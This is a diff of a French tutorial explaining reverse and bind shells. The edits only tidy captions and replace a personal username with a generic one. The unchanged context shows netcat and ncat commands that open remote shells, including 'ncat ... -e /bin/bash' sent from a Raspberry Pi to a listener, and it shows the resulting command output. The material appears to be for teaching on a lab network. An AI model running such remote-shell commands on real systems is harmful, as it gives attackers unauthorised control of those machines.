@@ -39,7 +39,7 @@ Un **reverse shell** est ce qui se produit quand une cible **éxécute un code q
 Notre machine
 
 ```shell
-user@ip:/home/user $ sudo nc -lvnp 443
+user@ip:~$ sudo nc -lvnp 443
 Listening on 0.0.0.0 443
 ```
 **Mise en place du listener**.
@@ -49,7 +49,7 @@ Machine cible
 ```shell
 root@raspberrypi:/# ncat 192.168.1.100 443 -e /bin/bash
 ```
-**Execution du script**
+**Execution du script**.
 
 Notre machine
 
@@ -70,7 +70,7 @@ script.py.save
 Templates
 Videos
 ```
-**Execution de commande sur la machine cible**
+**Execution de commande sur la machine cible**.
 
 ### Bind shell
 
@@ -86,12 +86,12 @@ Ncat: Listening on 0.0.0.0:4433
 Ncat: Connection from 192.168.1.100.
 Ncat: Connection from 192.168.1.100:57085.
 ```
-**Lancement du serveur netcat.**
+**Lancement du serveur netcat**.
 
 Notre machine
 
 ```shell
-claquetteuuuh@DESKTOP-PC1BC1G:~$ nc 192.168.1.104 4433
+user@ip:~$ nc 192.168.1.104 4433
 ls
 Bookshelf
 Desktop
@@ -108,4 +108,5 @@ Templates
 Videos
 
 ```
-Connection au port.
+**Connection au port**.
+
